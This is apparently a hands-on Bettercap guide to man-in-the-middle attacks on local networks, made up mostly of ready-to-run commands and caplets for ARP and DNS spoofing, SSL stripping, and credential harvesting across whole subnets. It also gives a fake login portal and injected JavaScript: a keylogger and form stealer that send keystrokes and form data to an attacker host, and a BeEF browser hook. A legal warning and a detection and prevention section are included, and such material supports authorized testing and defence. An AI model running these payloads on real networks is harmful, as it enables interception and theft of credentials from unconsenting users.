# Bettercap Man-in-the-Middle (MITM) Attack Guide

## Table of Contents
1. [Introduction to MITM](#introduction-to-mitm)
2. [Prerequisites](#prerequisites)
3. [Basic ARP Spoofing](#basic-arp-spoofing)
4. [Traffic Sniffing](#traffic-sniffing)
5. [DNS Spoofing](#dns-spoofing)
6. [SSL Stripping](#ssl-stripping)
7. [HTTP/HTTPS Proxy](#httphttps-proxy)
8. [Credential Harvesting](#credential-harvesting)
9. [JavaScript Injection](#javascript-injection)
10. [Advanced MITM Scenarios](#advanced-mitm-scenarios)
11. [Detection and Prevention](#detection-and-prevention)

---

## Introduction to MITM

A Man-in-the-Middle (MITM) attack is when an attacker intercepts communication between two parties without their knowledge. Bettercap automates this process for authorized penetration testing.

### Attack Flow
```
Victim → Attacker (intercepts/modifies) → Router/Gateway → Internet
```

### Common MITM Techniques
- **ARP Spoofing**: Poison ARP cache to redirect traffic
- **DNS Spoofing**: Redirect DNS queries to malicious IPs
- **SSL Stripping**: Downgrade HTTPS to HTTP
- **Proxy**: Intercept and modify HTTP/HTTPS traffic

### Legal Warning
⚠️ **CRITICAL**: Only perform MITM attacks on networks you own or have written authorization to test. Unauthorized interception is illegal under laws like:
- Computer Fraud and Abuse Act (USA)
- Computer Misuse Act (UK)
- Similar laws worldwide

---

## Prerequisites

### System Requirements
```bash
# Enable IP forwarding (required for MITM)
sudo sysctl -w net.ipv4.ip_forward=1

# Make permanent (optional)
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf

# Verify
cat /proc/sys/net/ipv4/ip_forward
# Should output: 1
```

### Network Information
Before starting, gather network information:

```bash
# Find your interface
ip addr show

# Find gateway
ip route | grep default

# Scan network (from bettercap)
sudo bettercap -iface eth0
> net.probe on
> net.show
```

### Required Tools
```bash
# Install additional tools
sudo apt install wireshark tshark ettercap-text-only
```

---

## Basic ARP Spoofing

ARP spoofing is the foundation of most MITM attacks on local networks.

### How ARP Spoofing Works
1. Attacker sends fake ARP replies to victim
2. Victim updates ARP cache with attacker's MAC address
3. Traffic intended for gateway goes to attacker
4. Attacker forwards traffic to real gateway (with IP forwarding)

### Simple ARP Spoof Attack

**Scenario**: Intercept traffic from a single target

```bash
# Start bettercap
sudo bettercap -iface eth0

# Enable network discovery
net.probe on

# Wait a moment, then show hosts
net.show

# Set target (replace with actual IP)
set arp.spoof.targets 192.168.1.50

# Enable full duplex (spoof both victim and gateway)
set arp.spoof.fullduplex true

# Start ARP spoofing
arp.spoof on

# Verify spoofing is working
# On victim machine: arp -a
# Gateway MAC should show your MAC address
```

### Spoof Multiple Targets

```bash
# Method 1: Comma-separated list
set arp.spoof.targets 192.168.1.50,192.168.1.51,192.168.1.52
arp.spoof on

# Method 2: CIDR range (entire subnet)
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Method 3: IP range
set arp.spoof.targets 192.168.1.50-192.168.1.100
arp.spoof on
```

### ARP Spoof with Specific Gateway

```bash
# Set custom gateway (auto-detected by default)
set gateway 192.168.1.1

# Set target
set arp.spoof.targets 192.168.1.50

# Start spoofing
arp.spoof on
```

### Caplet for ARP Spoofing

Create `arp-mitm.cap`:
```bash
# Set target
set arp.spoof.targets 192.168.1.50
set arp.spoof.fullduplex true

# Enable packet forwarding
set arp.spoof.internal true

# Start spoofing
arp.spoof on

# Enable network discovery
net.probe on
```

Run caplet:
```bash
sudo bettercap -iface eth0 -caplet arp-mitm.cap
```

---

## Traffic Sniffing

Once MITM is established, capture and analyze traffic.

### Basic Sniffing

```bash
# Start ARP spoofing first
set arp.spoof.targets 192.168.1.50
arp.spoof on

# Enable sniffer
net.sniff on

# Sniff only specific traffic
set net.sniff.filter "tcp port 80 or tcp port 443"
net.sniff on

# View captured data in real-time
```

### Sniff Specific Protocols

```bash
# HTTP only
set net.sniff.filter "tcp port 80"
net.sniff on

# HTTPS only
set net.sniff.filter "tcp port 443"
net.sniff on

# DNS queries
set net.sniff.filter "udp port 53"
net.sniff on

# FTP credentials
set net.sniff.filter "tcp port 21"
net.sniff on

# Email (SMTP, IMAP, POP3)
set net.sniff.filter "tcp port 25 or tcp port 110 or tcp port 143"
net.sniff on
```

### Advanced Sniffing Options

```bash
# Show verbose output
set net.sniff.verbose true

# Sniff local traffic too
set net.sniff.local true

# Output to pcap file for Wireshark analysis
set net.sniff.output /tmp/capture.pcap
net.sniff on

# Later, analyze with Wireshark:
# wireshark /tmp/capture.pcap
```

### Sniffing Caplet

Create `sniff-all.cap`:
```bash
# Set target to entire subnet
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.fullduplex true
arp.spoof on

# Configure sniffer
set net.sniff.verbose true
set net.sniff.local false
set net.sniff.output /tmp/mitm-capture.pcap
set net.sniff.filter "not arp"

# Start sniffing
net.sniff on

# Enable discovery
net.probe on
```

---

## DNS Spoofing

Redirect victims to malicious websites by spoofing DNS responses.

### Basic DNS Spoofing

**Scenario**: Redirect example.com to attacker's IP

```bash
# Start ARP spoofing
set arp.spoof.targets 192.168.1.50
arp.spoof on

# Set domain to spoof
set dns.spoof.domains example.com

# Set IP to redirect to (your attacking machine)
set dns.spoof.address 192.168.1.100

# Start DNS spoofing
dns.spoof on
```

### Spoof Multiple Domains

```bash
# Comma-separated domains
set dns.spoof.domains facebook.com,google.com,twitter.com

# All domains (wildcard)
set dns.spoof.all true

# Exclude specific domains
set dns.spoof.domains *.com
```

### DNS Spoofing with Custom Responses

Create hosts file `dns-hosts.txt`:
```
facebook.com 192.168.1.100
google.com 192.168.1.101
*.example.com 192.168.1.102
```

Use in bettercap:
```bash
set dns.spoof.hosts /path/to/dns-hosts.txt
dns.spoof on
```

### Complete DNS Spoof Caplet

Create `dns-mitm.cap`:
```bash
# ARP spoofing
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# DNS spoofing
set dns.spoof.all true
set dns.spoof.address 192.168.1.100

# Log DNS queries
set dns.spoof.verbose true

# Start DNS spoofing
dns.spoof on

# Network discovery
net.probe on
```

### Creating Fake Login Page

1. Clone target website:
```bash
# Clone login page
wget -r -l 1 -p -k https://example.com/login

# Serve with Python
cd example.com
python3 -m http.server 80
```

2. Setup DNS spoof to redirect to your server:
```bash
set dns.spoof.domains example.com
set dns.spoof.address 192.168.1.100  # Your IP
dns.spoof on
```

---

## SSL Stripping

Downgrade HTTPS connections to HTTP to capture credentials.

### How SSL Stripping Works
1. Victim requests HTTPS site
2. Attacker establishes HTTPS with real server
3. Attacker serves HTTP to victim
4. Victim thinks they're on HTTP, sends cleartext credentials
5. Attacker captures credentials, forwards encrypted to server

### Basic SSL Strip Attack

```bash
# Start ARP spoofing
set arp.spoof.targets 192.168.1.50
arp.spoof on

# Enable HTTP proxy with SSL strip
set http.proxy.sslstrip true

# Start HTTP proxy
http.proxy on

# Monitor captured data
```

### SSL Strip with HTTPS Proxy

```bash
# Start ARP spoofing
set arp.spoof.targets 192.168.1.50
arp.spoof on

# Configure HTTPS proxy
set https.proxy.sslstrip true

# Optional: ignore certificate errors
set https.proxy.certificate /usr/local/share/bettercap/bettercap-ca.crt

# Start HTTPS proxy
https.proxy on
```

### SSL Strip Caplet

Create `sslstrip.cap`:
```bash
# ARP spoofing
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.fullduplex true
arp.spoof on

# SSL stripping
set http.proxy.sslstrip true
set https.proxy.sslstrip true

# Start proxies
http.proxy on
https.proxy on

# Sniffing
set net.sniff.verbose true
net.sniff on

# Discovery
net.probe on
```

**Note**: Modern browsers with HSTS (HTTP Strict Transport Security) are resistant to SSL stripping for known domains.

---

## HTTP/HTTPS Proxy

Intercept and modify web traffic in real-time.

### Basic HTTP Proxy

```bash
# Start ARP spoofing
set arp.spoof.targets 192.168.1.50
arp.spoof on

# Configure HTTP proxy
set http.proxy.port 8080
set http.proxy.address 0.0.0.0

# Start proxy
http.proxy on
```

### HTTPS Proxy with Certificate

```bash
# Generate CA certificate (first time)
# Already included in bettercap at:
# /usr/local/share/bettercap/bettercap-ca.crt
# /usr/local/share/bettercap/bettercap-ca.key

# Start ARP spoofing
set arp.spoof.targets 192.168.1.50
arp.spoof on

# Configure HTTPS proxy
set https.proxy.certificate /usr/local/share/bettercap/bettercap-ca.crt
set https.proxy.key /usr/local/share/bettercap/bettercap-ca.key

# Start HTTPS proxy
https.proxy on
```

### Custom Proxy Script

Create JavaScript proxy script `inject.js`:
```javascript
function onRequest(req, res) {
    // Log all requests
    log("→ " + req.Method + " " + req.Hostname + req.Path);

    // Modify requests
    if(req.Hostname.indexOf("example.com") != -1) {
        log("Example.com request detected!");
    }
}

function onResponse(req, res) {
    // Modify responses
    var body = res.ReadBody();

    // Inject JavaScript into HTML pages
    if(res.ContentType.indexOf("text/html") != -1) {
        body = body.replace(
            "</body>",
            "<script>alert('Hacked!');</script></body>"
        );
        res.Body = body;
    }
}
```

Use script:
```bash
set http.proxy.script /path/to/inject.js
http.proxy on
```

### Proxy with Request/Response Logging

```bash
# Enable verbose logging
set http.proxy.verbose true
set https.proxy.verbose true

# Log to file
set events.stream.output /tmp/proxy-log.txt
events.stream on

# Start proxies
http.proxy on
https.proxy on
```

---

## Credential Harvesting

Capture usernames and passwords from network traffic.

### Using Net Sniffer for Credentials

```bash
# Start MITM
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Enable credential detection
set net.sniff.verbose true
set net.sniff.local false

# Filter for auth traffic
set net.sniff.filter "tcp port 80 or tcp port 21 or tcp port 23"

# Start sniffing
net.sniff on

# Bettercap automatically detects and displays credentials
```

### HTTP Credential Capture

```bash
# ARP spoof
set arp.spoof.targets 192.168.1.50
arp.spoof on

# HTTP proxy with SSL strip
set http.proxy.sslstrip true
http.proxy on

# Sniffer for HTTP POST data
set net.sniff.verbose true
net.sniff on
```

### Complete Credential Harvesting Caplet

Create `harvest.cap`:
```bash
# Network discovery
net.probe on

# ARP spoofing - entire network
set arp.spoof.targets 192.168.1.0/24
set arp.spoof.fullduplex true
arp.spoof on

# SSL stripping
set http.proxy.sslstrip true
set https.proxy.sslstrip true
http.proxy on
https.proxy on

# Credential sniffing
set net.sniff.verbose true
set net.sniff.local false
set net.sniff.output /tmp/credentials.pcap

# Filter for common auth protocols
set net.sniff.filter "tcp port 80 or tcp port 21 or tcp port 23 or tcp port 110 or tcp port 143"

net.sniff on

# Logging
set events.stream.output /tmp/bettercap-harvest.log
events.stream on
```

Run:
```bash
sudo bettercap -iface eth0 -caplet harvest.cap
```

### Analyzing Captured Credentials

```bash
# View log file
cat /tmp/bettercap-harvest.log | grep -i "password\|username\|login"

# Analyze pcap with Wireshark
wireshark /tmp/credentials.pcap

# Or use tshark
tshark -r /tmp/credentials.pcap -Y "http.request.method == POST" -T fields -e frame.number -e http.host -e http.request.uri -e http.file_data
```

---

## JavaScript Injection

Inject malicious JavaScript into web pages.

### BeEF Integration

BeEF (Browser Exploitation Framework) works great with bettercap.

1. Start BeEF:
```bash
cd /usr/share/beef-xss
./beef
# UI: http://127.0.0.1:3000/ui/panel
# Hook: http://192.168.1.100:3000/hook.js
```

2. Create injection script `beef-inject.js`:
```javascript
function onResponse(req, res) {
    var body = res.ReadBody();

    // Inject BeEF hook into HTML pages
    if(res.ContentType.indexOf("text/html") != -1) {
        var beefHook = '<script src="http://192.168.1.100:3000/hook.js"></script>';

        if(body.indexOf("</head>") != -1) {
            body = body.replace("</head>", beefHook + "</head>");
        } else if(body.indexOf("<body>") != -1) {
            body = body.replace("<body>", "<body>" + beefHook);
        }

        res.Body = body;
    }
}
```

3. Run bettercap with injection:
```bash
# Start bettercap
sudo bettercap -iface eth0

# ARP spoof
set arp.spoof.targets 192.168.1.50
arp.spoof on

# Load injection script
set http.proxy.script /path/to/beef-inject.js
http.proxy on
```

### Custom JavaScript Injection

Create `custom-inject.js`:
```javascript
function onResponse(req, res) {
    var body = res.ReadBody();

    if(res.ContentType.indexOf("text/html") != -1) {
        var maliciousJS = `
            <script>
                // Keylogger
                document.addEventListener('keypress', function(e) {
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', 'http://192.168.1.100/keylog', true);
                    xhr.send(e.key);
                });

                // Form stealer
                document.addEventListener('submit', function(e) {
                    var form = new FormData(e.target);
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', 'http://192.168.1.100/formdata', true);
                    xhr.send(form);
                });
            </script>
        `;

        body = body.replace("</body>", maliciousJS + "</body>");
        res.Body = body;
    }
}
```

### Image Replacement

Replace all images with custom image:

```javascript
function onResponse(req, res) {
    var contentType = res.ContentType;

    // Replace images
    if(contentType.indexOf("image/") != -1) {
        // Redirect to custom image
        res.Status = 302;
        res.Headers["Location"] = "http://192.168.1.100/troll.jpg";
    }
}
```

---

## Advanced MITM Scenarios

### Scenario 1: Corporate Network Assessment

**Goal**: Test corporate network security, capture credentials, identify vulnerable hosts.

Caplet `corp-assessment.cap`:
```bash
# Discovery
net.probe on
set ticker.period 5
ticker on

# Target entire network
set arp.spoof.targets 192.168.10.0/24
set arp.spoof.fullduplex true
arp.spoof on

# DNS spoofing for specific domains
set dns.spoof.domains login.microsoftonline.com,accounts.google.com
set dns.spoof.address 192.168.10.50
dns.spoof on

# Proxies with SSL strip
set http.proxy.sslstrip true
set https.proxy.sslstrip true
http.proxy on
https.proxy on

# Comprehensive sniffing
set net.sniff.verbose true
set net.sniff.output /tmp/corp-assessment.pcap
net.sniff on

# Logging
set events.stream.output /tmp/corp-assessment.log
events.stream on
```

### Scenario 2: WiFi Guest Network Test

**Goal**: Test guest WiFi isolation and capture traffic.

Caplet `guest-wifi-test.cap`:
```bash
# Discovery
net.probe on

# Target all guests (example range)
set arp.spoof.targets 10.20.30.0/24
arp.spoof on

# Intercept all DNS
set dns.spoof.all true
set dns.spoof.address 10.20.30.100
dns.spoof on

# HTTP proxy for credential capture
http.proxy on

# Sniff all traffic
set net.sniff.verbose true
set net.sniff.output /tmp/guest-capture.pcap
net.sniff on
```

### Scenario 3: IoT Device Analysis

**Goal**: Analyze IoT device communications.

```bash
# Start bettercap
sudo bettercap -iface eth0

# Find IoT device
net.probe on
net.show

# Target specific IoT device
set arp.spoof.targets 192.168.1.150
arp.spoof on

# Sniff all its traffic
set net.sniff.verbose true
set net.sniff.output /tmp/iot-device.pcap
set net.sniff.local false
net.sniff on

# Monitor for 30 minutes, then analyze
# tshark -r /tmp/iot-device.pcap
```

### Scenario 4: MITM with Captive Portal

Redirect all HTTP traffic to fake login page.

1. Setup fake portal:
```bash
# Create simple portal
mkdir /tmp/portal
cat > /tmp/portal/index.html << 'EOF'
<html>
<body>
<h2>Network Login Required</h2>
<form action="capture.php" method="post">
    Username: <input type="text" name="user"><br>
    Password: <input type="password" name="pass"><br>
    <input type="submit" value="Login">
</form>
</body>
</html>
EOF

# Serve portal
cd /tmp/portal
python3 -m http.server 80
```

2. Run bettercap:
```bash
# Start bettercap
sudo bettercap -iface eth0

# ARP spoof
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Redirect all domains to portal
set dns.spoof.all true
set dns.spoof.address 192.168.1.100
dns.spoof on
```

---

## Detection and Prevention

### Detecting MITM Attacks

#### On Client Side:
```bash
# Check ARP table for duplicates
arp -a | sort

# Monitor for ARP changes
watch -n 1 'arp -a'

# Use ARP monitoring tools
sudo apt install arpwatch
sudo arpwatch -i eth0

# Check for unexpected gateway MAC
ip route show
arp -a | grep "$(ip route | grep default | awk '{print $3}')"
```

#### Network Monitoring:
```bash
# Use Wireshark to detect ARP spoofing
# Look for: "ARP reply not asked for"

# Monitor with tcpdump
sudo tcpdump -i eth0 arp

# Detect with Snort/Suricata IDS rules
```

### Preventing MITM Attacks

#### Client Side:
1. **Static ARP Entries**:
```bash
# Add static ARP entry
sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff
```

2. **Use VPN**: Encrypt all traffic
```bash
sudo openvpn --config client.ovpn
```

3. **HTTPS Everywhere**: Browser extension

4. **Certificate Pinning**: For critical apps

#### Network Side:
1. **Dynamic ARP Inspection (DAI)** on switches
2. **Port Security**: Limit MAC addresses per port
3. **802.1X Authentication**: Network access control
4. **DHCP Snooping**: Prevent rogue DHCP servers
5. **IDS/IPS**: Deploy Snort/Suricata

#### Switch Configuration (Cisco Example):
```cisco
! Enable DHCP snooping
ip dhcp snooping
ip dhcp snooping vlan 10

! Enable Dynamic ARP Inspection
ip arp inspection vlan 10

! Port security
interface GigabitEthernet0/1
 switchport port-security
 switchport port-security maximum 2
 switchport port-security violation restrict
```

---

## Troubleshooting

### MITM Not Working

```bash
# 1. Verify IP forwarding
cat /proc/sys/net/ipv4/ip_forward
# Should be 1

# 2. Check iptables isn't blocking
sudo iptables -L -v

# 3. Verify ARP spoofing is active
arp.spoof

# 4. Check target is reachable
ping <target-ip>

# 5. Verify interface is correct
get iface

# 6. Check for conflicting processes
sudo netstat -tulpn | grep -E ':(80|443|53)'
```

### No Credentials Captured

```bash
# 1. Ensure SSL strip is enabled
set http.proxy.sslstrip true

# 2. Verify proxy is running
http.proxy

# 3. Check sniffer is active
net.sniff

# 4. Most sites use HTTPS with HSTS (can't strip)
# Need to use DNS spoof + fake page

# 5. Enable verbose mode
set net.sniff.verbose true
```

### DNS Spoofing Not Working

```bash
# 1. Verify DNS spoof is running
dns.spoof

# 2. Check domains are set
get dns.spoof.domains

# 3. Clear victim's DNS cache
# On victim (Windows): ipconfig /flushdns
# On victim (Linux): sudo systemd-resolve --flush-caches

# 4. Check for hardcoded DNS (8.8.8.8)
# Use iptables to redirect:
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
```

---

## Best Practices

### For Penetration Testing:

1. **Get Authorization**: Written permission is mandatory
2. **Document Everything**: Keep detailed logs
3. **Minimize Impact**: Target specific hosts, not entire network
4. **Test Off-Hours**: Reduce disruption
5. **Have Rollback Plan**: Be ready to stop attack if issues arise
6. **Use Non-Invasive Techniques First**: Start with passive recon

### For Learning:

1. **Use Virtual Labs**: Practice on VMs (VirtualBox, VMware)
2. **Setup Isolated Network**: Use separate router/switch
3. **Practice Legally**: Use vulnerable VMs (Metasploitable, DVWA)
4. **Understand Tools**: Don't just run scripts
5. **Learn Defenses**: Understanding prevention is crucial

---

## Summary

Bettercap is a powerful MITM tool. Key takeaways:

- **ARP Spoofing** is the foundation of LAN MITM
- **Always enable IP forwarding** for MITM to work
- **SSL Stripping** is less effective now due to HSTS
- **DNS Spoofing + Fake Pages** is more reliable
- **Caplets** automate complex attacks
- **Ethical use only** - get authorization first

---

## Next Steps

- [WiFi Pentesting Guide](BETTERCAP-WIFI-GUIDE.md) - WiFi attacks
- [Quick Reference](BETTERCAP-CHEATSHEET.md) - Command cheat sheet
- [Main Guide](BETTERCAP-COMPLETE-GUIDE.md) - Installation and basics

---

**Last Updated**: November 2025
